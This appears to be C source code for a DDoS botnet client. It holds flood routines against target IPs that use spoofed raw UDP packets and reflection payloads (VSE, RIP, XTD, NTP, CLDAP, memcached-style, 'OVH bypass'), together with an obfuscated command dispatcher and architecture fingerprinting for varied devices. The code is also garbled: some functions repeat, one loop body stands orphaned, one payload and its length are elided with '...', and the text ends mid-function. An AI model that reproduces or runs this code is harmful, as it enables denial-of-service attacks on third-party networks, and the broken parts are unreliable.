    char *rip_payload = "\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10";
    int rip_payload_len = 24;

    // setting up the ip header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + packetSize + rip_payload_len;
    iph->id = rand_cmwc();
    iph->frag_off = 0;
    iph->ttl = MAXTTL;
    iph->protocol = protocol;
    iph->check = 0; // checksum is calculated later
    iph->saddr = source;
    iph->daddr = dest;
}
/**
 * performs a rip attack on a target ip address
 * sets up socket and payload, then sends packets in a loop
 * either using udp (if spoofit is 32) or raw sockets
 *
 * @param target target ip address as a string
 * @param port target port number
 * @param timeEnd duration to send packets in seconds
 * @param spoofit ip spoofing level
 * @param packetsize size of each packet
 * @param pollinterval interval to change port
 * @param sleepcheck interval to sleep
 * @param sleeptime sleep time in milliseconds
 */
void ripattack(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval, int sleepcheck, int sleeptime) {
    char *rip_payload = "\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10";
    int rip_payload_len = 24;
    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = port == 0 ? rand_cmwc() : htons(port);
    if (getHost(target, &dest_addr.sin_addr)) return;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

    int sockfd = (spoofit == 32) ? socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP) : socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sockfd < 0) return;

    unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
    if (buf == NULL) {
        close(sockfd);
        return;
    }
    memset(buf, 0, packetsize + 1);
    makeRandomStr(buf, packetsize);

    int end = time(NULL) + timeEnd;
    for (unsigned int i = 0, ii = 0;;) {
        sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
        if (i++ == pollinterval) {
            if (port == 0) dest_addr.sin_port = rand_cmwc();
            if (time(NULL) > end) break;
            i = 0;
        }
        if (ii++ == sleepcheck) {
            usleep(sleeptime * 1000);
            ii = 0;
        }
    }

    free(buf);
    close(sockfd);
}
/**
 * constructs a packet with an extended payload
 * the payload and length are hardcoded
 *
 * @param iph pointer to the ip header structure
 * @param dest destination ip address
 * @param source source ip address
 * @param protocol ip protocol
 * @param packetSize size of the payload
 */
void makextdpacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize) {
    char *xtd_payload = "8d\xc1x\x01\xb8\x9b\xcb\x8f\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";
    int xtd_payload_len = 220; // approximated length of the xtd_payload

    // setting up the ip header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + packetSize + xtd_payload_len;
    iph->id = rand_cmwc();
    iph->frag_off = 0;
    iph->ttl = MAXTTL;
    iph->protocol = protocol;
    iph->check = 0; // checksum is calculated later
    iph->saddr = source;
    iph->daddr = dest;
}
/**
 * performs an xtd attack on a target ip address
 * 
 * @param target target ip address as a string
 * @param port target port number
 * @param timeEnd duration to send packets in seconds
 * @param spoofit ip spoofing level
 * @param packetsize size of each packet
 * @param pollinterval interval to change port
 * @param sleepcheck interval to sleep
 * @param sleeptime sleep time in milliseconds
 */
/**
 * performs an xtd attack on a target ip address
 * 
 * @param target target ip address as a string
 * @param port target port number
 * @param timeEnd duration to send packets in seconds
 * @param spoofit ip spoofing level
 * @param packetsize size of each packet
 * @param pollinterval interval to change port
 * @param sleepcheck interval to sleep
 * @param sleeptime sleep time in milliseconds
 */
void xtdattack(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval, int sleepcheck, int sleeptime) {
    // define the payload and its length
    char *xtd_payload = "8d\xc1x\x01\xb8\x9b\xcb\x8f\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e..."; // truncated for brevity
    int xtd_payload_len = ...; // actual length of xtd_payload

    // set up destination address structure
    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = port == 0 ? rand_cmwc() : htons(port);
    if (getHost(target, &dest_addr.sin_addr)) return;

    // create socket based on spoofing parameter
    int sockfd = spoofit == 32 ? socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP) : socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sockfd < 0) return;

    // buffer for sending packets
    unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
    if (buf == NULL) {
        close(sockfd);
        return;
    }

    // main loop for sending packets
    int end = time(NULL) + timeEnd;
    for (unsigned int i = 0, ii = 0;;) {
        // send packet
        sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

        // handle poll interval
        if (i++ == pollinterval) {
            dest_addr.sin_port = port == 0 ? rand_cmwc() : htons(port);
            if (time(NULL) > end) break;
            i = 0;
        }

        // sleep check
        if (ii++ == sleepcheck) {
            usleep(sleeptime * 1000);
            ii = 0;
        }
    }

    // clean up
    free(buf);
    close(sockfd);
}
/**
 * constructs a packet with a vse payload
 *
 * @param iph pointer to the ip header structure
 * @param dest destination ip address
 * @param source source ip address
 * @param protocol ip protocol
 * @param packetSize size of the payload
 */
void makevsepacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize) {
    // define the payload and its length
    char *vse_payload = "\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79";
    int vse_payload_len = 20;

    // setting up the ip header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + packetSize + vse_payload_len;
    iph->id = rand_cmwc();
    iph->frag_off = 0;
    iph->ttl = MAXTTL;
    iph->protocol = protocol;
    iph->check = 0; // checksum is calculated later
    iph->saddr = source;
    iph->daddr = dest;
}
/**
 * performs a vse attack on a target ip address
 *
 * @param target target ip address as a string
 * @param port target port number
 * @param timeEnd duration to send packets in seconds
 * @param spoofit ip spoofing level
 * @param packetsize size of each packet
 * @param pollinterval interval to change port
 * @param sleepcheck interval to sleep
 * @param sleeptime sleep time in milliseconds
 */
void vseattack(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval, int sleepcheck, int sleeptime) {
    char *vse_payload = "\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79";
    int vse_payload_len = 20;

    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = port == 0 ? rand_cmwc() : htons(port);
    if (getHost(target, &dest_addr.sin_addr)) return;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

    int sockfd = spoofit == 32 ? socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP) : socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sockfd < 0) return;

    unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
    if (buf == NULL) {
        close(sockfd);
        return;
    }
    memset(buf, 0, packetsize + 1);
    makeRandomStr(buf, packetsize);

    int end = time(NULL) + timeEnd;
    for (unsigned int i = 0, ii = 0;;) {
        sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

        if (i++ == pollinterval) {
            dest_addr.sin_port = port == 0 ? rand_cmwc() : htons(port);
            if (time(NULL) > end) break;
            i = 0;
        }

        if (ii++ == sleepcheck) {
            usleep(sleeptime * 1000);
            ii = 0;
        }
    }

    free(buf);
    close(sockfd);
}

    // main loop for sending packets
    int end = time(NULL) + timeEnd;
    for (unsigned int i = 0, ii = 0;;) {
        // send packet
        sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

        // handle poll interval
        if (i++ == pollinterval) {
            dest_addr.sin_port = port == 0 ? rand_cmwc() : htons(port);
            if (time(NULL) > end) break;
            i = 0;
        }

        // sleep check
        if (ii++ == sleepcheck) {
            usleep(sleeptime * 1000);
            ii = 0;
        }
    }

    // clean up
    free(buf);
    close(sockfd);
}
/**
 * constructs a packet with a vse payload
 *
 * @param iph pointer to the ip header structure
 * @param dest destination ip address
 * @param source source ip address
 * @param protocol ip protocol
 * @param packetSize size of the payload
 */
void makevsepacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize) {
    // define the payload and its length
    char *vse_payload = "\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79";
    int vse_payload_len = 20;

    // setting up the ip header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + packetSize + vse_payload_len;
    iph->id = rand_cmwc();
    iph->frag_off = 0;
    iph->ttl = MAXTTL;
    iph->protocol = protocol;
    iph->check = 0; // checksum is calculated later
    iph->saddr = source;
    iph->daddr = dest;
}

/**
 * constructs a packet with an echo payload
 *
 * @param iph pointer to the ip header structure
 * @param dest destination ip address
 * @param source source ip address
 * @param protocol ip protocol
 * @param packetSize size of the payload
 */
void makeechopacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize) {
    char *echo_payload = "\x0D\x0A\x0D\x0A";
    int echo_payload_len = 4;

    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + packetSize + echo_payload_len;
    iph->id = rand_cmwc();
    iph->frag_off = 0;
    iph->ttl = MAXTTL;
    iph->protocol = protocol;
    iph->check = 0;
    iph->saddr = source;
    iph->daddr = dest;
}
/**
 * performs an echo attack on a target ip address
 * 
 * @param target target ip address as a string
 * @param port target port number
 * @param timeEnd duration to send packets in seconds
 * @param spoofit ip spoofing level
 * @param packetsize size of each packet
 * @param pollinterval interval to change port
 * @param sleepcheck interval to sleep
 * @param sleeptime sleep time in milliseconds
 */
void echoattack(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval, int sleepcheck, int sleeptime) {
    // define the payload and its length
    char *echo_payload = "\x0D\x0A\x0D\x0A";
    int echo_payload_len = 4; // actual length of echo_payload

    // set up destination address structure
    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = port == 0 ? rand_cmwc() : htons(port);
    if (getHost(target, &dest_addr.sin_addr)) return;

    // create socket based on spoofing parameter
    int sockfd = spoofit == 32 ? socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP) : socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sockfd < 0) return;

    // buffer for sending packets
    unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
    if (buf == NULL) {
        close(sockfd);
        return;
    }

    // main loop for sending packets
    int end = time(NULL) + timeEnd;
    for (unsigned int i = 0, ii = 0;;) {
        // send packet
        sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

        // handle poll interval
        if (i++ == pollinterval) {
            dest_addr.sin_port = port == 0 ? rand_cmwc() : htons(port);
            if (time(NULL) > end) break;
            i = 0;
        }

        // sleep check
        if (ii++ == sleepcheck) {
            usleep(sleeptime * 1000);
            ii = 0;
        }
    }

    // clean up
    free(buf);
    close(sockfd);
}
/**
 * establishes a TCP connection to a given host and port
 * 
 * @param host hostname or ip address to connect
 * @param port port number to connect
 * @return socket descriptor if successful, 0 otherwise
 */
int socket_connect(char *host, in_port_t port) {
    struct hostent *hp;
    struct sockaddr_in addr;
    int on = 1, sock;

    // resolving the host name
    if ((hp = gethostbyname(host)) == NULL) return 0;
    bcopy(hp->h_addr, &addr.sin_addr, hp->h_length);

    // setting up socket address structure
    addr.sin_port = htons(port);
    addr.sin_family = AF_INET;

    // creating socket
    sock = socket(PF_INET, SOCK_STREAM, 0);
    if (sock == -1) return 0;

    // setting socket options
    setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (const char *)&on, sizeof(int));

    // establishing connection
    if (connect(sock, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1) return 0;

    return sock;
}
/**
 * returns the architecture type as a string
 * checks various predefined macros to determine the architecture
 */
char *getArch() {
    #if defined(__x86_64__) || defined(_M_X64)
    return "x86_64"; // for 64-bit x86 architecture
    #elif defined(i386) || defined(__i386__) || defined(__i386) || defined(_M_IX86)
    return "x86_32"; // for 32-bit x86 architecture
    #elif defined(__ARM_ARCH_2__) || defined(__ARM_ARCH_3__) || defined(__ARM_ARCH_3M__) || defined(__ARM_ARCH_4T__) || defined(__TARGET_ARM_4T)
    return "Arm4";   // for ARM v4 architecture
    #elif defined(__ARM_ARCH_5_) || defined(__ARM_ARCH_5E_)
    return "Arm5";   // for ARM v5 architecture
    #elif defined(__ARM_ARCH_6T2_) || defined(__ARM_ARCH_6T2_) ||defined(__ARM_ARCH_6__) || defined(__ARM_ARCH_6J__) || defined(__ARM_ARCH_6K__) || defined(__ARM_ARCH_6Z__) || defined(__ARM_ARCH_6ZK__) || defined(__aarch64__)
    return "Arm6";   // for ARM v6 architecture
    #elif defined(__ARM_ARCH_7__) || defined(__ARM_ARCH_7A__) || defined(__ARM_ARCH_7R__) || defined(__ARM_ARCH_7M__) || defined(__ARM_ARCH_7S__)
    return "Arm7";   // for ARM v7 architecture
    #elif defined(mips) || defined(__mips__) || defined(__mips)
    return "Mips";   // for MIPS architecture
    #elif defined(mipsel) || defined (__mipsel__) || defined (__mipsel) || defined (_mipsel)
    return "Mipsel"; // for MIPS (little-endian) architecture
    #elif defined(__sh__)
    return "Sh4";    // for SuperH architecture
    #elif defined(__powerpc) || defined(__powerpc__) || defined(__powerpc64__) || defined(__POWERPC__) || defined(__ppc__) || defined(__ppc64__) || defined(__PPC__) || defined(__PPC64__) || defined(_ARCH_PPC) || defined(_ARCH_PPC64)
    return "Ppc";    // for PowerPC architecture
    #elif defined(__sparc__) || defined(__sparc)
    return "spc";    // for SPARC architecture
    #elif defined(__m68k__)
    return "M68k";   // for Motorola 68k architecture
    #elif defined(__arc__)
    return "Arc";    // for ARC architecture
    #else
    return "Unknown Architecture"; // if none of the above
    #endif
}
/**
 * returns a port number as a string based on available programs
 * checks for the existence of certain programs and returns a specific port
 */
char *getPorts() {
    // Check for Python, Perl, and Telnetd. If any exist, return port "22"
    if (access("/usr/bin/python", F_OK) != -1) {
        return "22";
    }
    if (access("/usr/bin/python3", F_OK) != -1) {
        return "22";
    }
    if (access("/usr/bin/perl", F_OK) != -1) {
        return "22";
    }
    if (access("/usr/sbin/telnetd", F_OK) != -1) {
        return "22";
    }

    // If none of the above programs exist, return "Unknown Port"
    return "unknown port";
}
void processCmd(int argc, unsigned char *argv[]) {
    // handling the "Tard UDP" command
    if (!strcmp(argv[0], decode("1-|"))) { // UDP ip port time
        if (argc < 4 || atoi(argv[3]) == -1 || atoi(argv[3]) > 10000 || atoi(argv[2]) == -1) { 
            return;
        }
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        int spoofed = 32;
        int packetsize = 10000;
        int pollinterval = 10;
        int sleepcheck = 1000000;
        int sleeptime = 0;
        if (strstr(ip, ",") != NULL) {
            unsigned char *hi = strtok(ip, ",");
            while (hi != NULL) {
                if (!listFork()) {
                    k2o_BB2(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                    _exit(0);
                }
                hi = strtok(NULL, ",");
            }
        } else {
            if (!listFork()) {
                k2o_BB2(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                _exit(0);
            }
        }
        return;
    }

    // command for STD attack
    if(!strcmp(argv[0], decode("6c-"))){
        if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1 || atoi(argv[3]) > 10000) {
            return;
        }
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        if(strstr(ip, ",") != NULL){
            unsigned char *hi = strtok(ip, ",");
            while(hi != NULL){
                if(!listFork()){
                    sendSTD(hi, port, time);
                    _exit(0);
                }
                hi = strtok(NULL, ",");
            }
        } else {
            if (listFork()) { return; }
            sendSTD(ip, port, time);
            _exit(0);
        }
    }

    // command for Zgo attack
    if(!strcmp(argv[0], decode("@<j"))){
        if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1 || atoi(argv[3]) > 10000) {
            return;
        }
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        if(strstr(ip, ",") != NULL){
            unsigned char *hi = strtok(ip, ",");
            while(hi != NULL){
                if(!listFork()){
                    sendZgo(hi, port, time);
                    _exit(0);
                }
                hi = strtok(NULL, ",");
            }
        } else {
            if (listFork()) { return; }
            sendZgo(ip, port, time);
            _exit(0);
        }
    }

    // command for ZDP attack
    if(!strcmp(argv[0], decode("@-|"))){
        if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1 || atoi(argv[3]) > 10000) {
            return;
        }
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        if(strstr(ip, ",") != NULL){
            unsigned char *hi = strtok(ip, ",");
            while(hi != NULL){
                if(!listFork()){
                    sendZDP(hi, port, time);
                    _exit(0);
                }
                hi = strtok(NULL, ",");
            }
        } else {
            if (listFork()) { return; }
            sendZDP(ip, port, time);
            _exit(0);
        }
    }

    // command for OvhBypassOne attack
    if(!strcmp(argv[0], decode(",dj"))){
        if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1 || atoi(argv[3]) > 10000) {
            return;
        }
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        if(strstr(ip, ",") != NULL){
            unsigned char *hi = strtok(ip, ",");
            while(hi != NULL){
                if(!listFork()){
                    sendOvhBypassOne(hi, port, time);
                    _exit(0);
                }
                hi = strtok(NULL, ",");
            }
        } else {
            if (listFork()) { return; }
            sendOvhBypassOne(ip, port, time);
            _exit(0);
        }
    }

    // command for OvhBypassTwo attack
    if(!strcmp(argv[0], "OVH")){
        if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1 || atoi(argv[3]) > 10000) {
            return;
        }
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        if(strstr(ip, ",") != NULL){
            unsigned char *hi = strtok(ip, ",");
            while(hi != NULL){
                if(!listFork()){
                    sendOvhBypassTwo(hi, port, time);
                    _exit(0);
                }
                hi = strtok(NULL, ",");
            }
        } else {
            if (listFork()) { return; }
            sendOvhBypassTwo(ip, port, time);
            _exit(0);
        }
    }

    // command for OvhBypassThree attack
    if(!strcmp(argv[0], decode("jge"))){
        if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1 || atoi(argv[3]) > 10000) {
            return;
        }
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        if(strstr(ip, ",") != NULL){
            unsigned char *hi = strtok(ip, ",");
            while(hi != NULL){
                if(!listFork()){
                    sendOvhBypassThree(hi, port, time);
                    _exit(0);
                }
                hi = strtok(NULL, ",");
            }
        } else {
            if (listFork()) { return; }
            sendOvhBypassThree(ip, port, time);
            _exit(0);
        }
    }
    // vseattack command: sends a VSE attack to the specified IP and port for a given time
    if(!strcmp(argv[0], decode("g6m"))) {
        if(argc < 4 || atoi(argv[3]) == -1 || atoi(argv[3]) > 10000 || atoi(argv[2]) == -1) {
            return;
        }
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        int spoofed = 32;
        int packetsize = 1024;
        int pollinterval = (argc > 4 ? atoi(argv[4]) : 1000);
        int sleepcheck = (argc > 5 ? atoi(argv[5]) : 1000000);
        int sleeptime = (argc > 6 ? atoi(argv[6]) : 0);

        if(strstr(ip, ",") != NULL) {
            unsigned char *hi = strtok(ip, ",");
            while(hi != NULL) {
                if(!listFork()) {
                    vseattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                    _exit(0);
                }   
                hi = strtok(NULL, ",");
            }
        } else {
            if (!listFork()) {
                vseattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                _exit(0);
            }
        }
    }
    // ripattack command: sends a RIP attack to the specified IP and port for a given time
    if(!strcmp(argv[0], decode("vx|"))) {
            if(argc < 4 || atoi(argv[3]) == -1 || atoi(argv[3]) > 10000 || atoi(argv[2]) == -1){
                return;
            }
            unsigned char *ip = argv[1];
            int port = atoi(argv[2]);
            int time = atoi(argv[3]);
            int spoofed = 32;
            int packetsize = 1024;
            int pollinterval = (argc > 4 ? atoi(argv[4]) : 1000);
            int sleepcheck = (argc > 5 ? atoi(argv[5]) : 1000000);
            int sleeptime = (argc > 6 ? atoi(argv[6]) : 0);
            if(strstr(ip, ",") != NULL) {
                unsigned char *hi = strtok(ip, ",");
                while(hi != NULL) {
                    if(!listFork()) {
                        ripattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                        _exit(0);
                    }
                    hi = strtok(NULL, ",");
                }
            } else {
                if (!listFork()){
                ripattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);}
                _exit(0);
            }
        }
        // echoattack command: sends an ECHO attack to the specified IP and port for a given time
        if(!strcmp(argv[0], decode("mDej"))) {
            if(argc < 4 || atoi(argv[3]) == -1 || atoi(argv[3]) > 10000 || atoi(argv[2]) == -1){
                return;
            }
            unsigned char *ip = argv[1];
            int port = atoi(argv[2]);
            int time = atoi(argv[3]);
            int spoofed = 32;
            int packetsize = 1024;
            int pollinterval = (argc > 4 ? atoi(argv[4]) : 1000);
            int sleepcheck = (argc > 5 ? atoi(argv[5]) : 1000000);
            int sleeptime = (argc > 6 ? atoi(argv[6]) : 0);
            if(strstr(ip, ",") != NULL) {
                unsigned char *hi = strtok(ip, ",");
                while(hi != NULL) {
                    if(!listFork()) {
                        echoattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                        _exit(0);
                    }
                    hi = strtok(NULL, ",");
                }
            } else {
                if (!listFork()){
                echoattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);}
                _exit(0);
            }
        }
        // xtdattack command: sends an XTD attack to the specified IP and port for a given time
        if(!strcmp(argv[0], decode("+c-"))) {
            if(argc < 4 || atoi(argv[3]) == -1 || atoi(argv[3]) > 10000 || atoi(argv[2]) == -1){
                return;
            }
            unsigned char *ip = argv[1];
            int port = atoi(argv[2]);
            int time = atoi(argv[3]);
            int spoofed = 32;
            int packetsize = 1024;
            int pollinterval = (argc > 4 ? atoi(argv[4]) : 1000);
            int sleepcheck = (argc > 5 ? atoi(argv[5]) : 1000000);
            int sleeptime = (argc > 6 ? atoi(argv[6]) : 0);
            if(strstr(ip, ",") != NULL) {
                unsigned char *hi = strtok(ip, ",");
                while(hi != NULL) {
                    if(!listFork()) {
                        xtdattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                        _exit(0);
                    }
                    hi = strtok(NULL, ",");
                }
            } else {
                if (!listFork()){
                xtdattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);}
                _exit(0);
            }
        }
        // cldapattack command: sends a CLDAP attack to the specified IP and port for a given time
        if(!strcmp(argv[0], decode("~-7|"))) {
            if(argc < 4 || atoi(argv[3]) == -1 || atoi(argv[3]) > 10000 || atoi(argv[2]) == -1){
                return;
            }
            unsigned char *ip = argv[1];
            int port = atoi(argv[2]);
            int time = atoi(argv[3]);
            int spoofed = 32;
            int packetsize = 1024;
            int pollinterval = (argc > 4 ? atoi(argv[4]) : 1000);
            int sleepcheck = (argc > 5 ? atoi(argv[5]) : 1000000);
            int sleeptime = (argc > 6 ? atoi(argv[6]) : 0);
            if(strstr(ip, ",") != NULL) {
                unsigned char *hi = strtok(ip, ",");
                while(hi != NULL) {
                    if(!listFork()) {
                        cldapattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                        _exit(0);
                    }
                    hi = strtok(NULL, ",");
                }
            } else {
                if (!listFork()){
                cldapattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);}
                _exit(0);
            }
        }
        // ntpattack command: sends an NTP attack to the specified IP and port for a given time
        if(!strcmp(argv[0], decode("6-|"))) {
            if(argc < 4 || atoi(argv[3]) == -1 || atoi(argv[3]) > 10000 || atoi(argv[2]) == -1){
                return;
            }
            unsigned char *ip = argv[1];
            int port = atoi(argv[2]);
            int time = atoi(argv[3]);
            int spoofed = 32;
            int packetsize = 1024;
            int pollinterval = (argc > 4 ? atoi(argv[4]) : 1000);
            int sleepcheck = (argc > 5 ? atoi(argv[5]) : 1000000);
            int sleeptime = (argc > 6 ? atoi(argv[6]) : 0);
            if(strstr(ip, ",") != NULL) {
                unsigned char *hi = strtok(ip, ",");
                while(hi != NULL) {
                    if(!listFork()) {
                        ntpattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                        _exit(0);
                    }
                    hi = strtok(NULL, ",");
                }
            } else {
                if (!listFork()){
                ntpattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);}
                _exit(0);
            }
        }
        // memattack command: sends a MEM attack to the specified IP and port for a given time
        if(!strcmp(argv[0], decode("hmh"))) {
            if(argc < 4 || atoi(argv[3]) == -1 || atoi(argv[3]) > 10000 || atoi(argv[2]) == -1){
                return;
            }
            unsigned char *ip = argv[1];
            int port = atoi(argv[2]);
            int time = atoi(argv[3]);
            int spoofed = 32;
            int packetsize = 1024;
            int pollinterval = (argc > 4 ? atoi(argv[4]) : 1000);
            int sleepcheck = (argc > 5 ? atoi(argv[5]) : 1000000);
            int sleeptime = (argc > 6 ? atoi(argv[6]) : 0);
            if(strstr(ip, ",") != NULL) {
                unsigned char *hi = strtok(ip, ",");
                while(hi != NULL) {
                    if(!listFork()) {
                        memattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                        _exit(0);
                    }
                    hi = strtok(NULL, ",");
                }
            } else {
                if (!listFork()){
                memattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);}
                _exit(0);
            }
        }
        // combined attack command: sends multiple types of attacks to the specified IP and port for a given time
        if(!strcmp(argv[0], decode("<7hm"))) {
            if(argc < 4 || atoi(argv[3]) == -1 || atoi(argv[3]) > 10000 || atoi(argv[2]) == -1){
                return;
            }
            unsigned char *ip = argv[1];
            int port = atoi(argv[2]);
            int time = atoi(argv[3]);
            int spoofed = 32;
            int packetsize = 1024;
            int pollinterval = (argc > 4 ? atoi(argv[4]) : 1000);
            int sleepcheck = (argc > 5 ? atoi(argv[5]) : 1000000);
            int sleeptime = (argc > 6 ? atoi(argv[6]) : 0);
            if(strstr(ip, ",") != NULL) {
                unsigned char *hi = strtok(ip, ",");
                while(hi != NULL) {
                    if(!listFork()) {
                        memattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                        vseattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                        cldapattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                        ntpattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                        xtdattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                        _exit(0);
                    }
                    hi = strtok(NULL, ",");
                }
            } else {
                if (!listFork()){
                        memattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                        vseattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                        ntpattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                        xtdattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                        cldapattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                    }
                _exit(0);
            }
        }
        // kills all child processes spawned by this program
        if(!strcmp(argv[0], decode("6cj|")))
        {
                int killed = 0;
                unsigned long i;
                for (i = 0; i < numpids; i++)
                {
                        if (pids[i] != 0 && pids[i] != getpid())
                        {
                                kill(pids[i], 9);
                                killed++;
                        }
                }
                if(killed > 0)
                {
                    //
                } else {
                            //
                       }
        }
}
// converts hexadecimal string to binary
void hex2bin(const char* in, size_t len, unsigned char* out) {
  static const unsigned char TBL[] = {
     0,   1,   2,   3,   4,   5,   6,   7,   8,   9,  58,  59,
    60,  61,  62,  63,  64,  10,  11,  12,  13,  14,  15
  };
  static const unsigned char *LOOKUP = TBL - 48;
  const char* end = in + len;

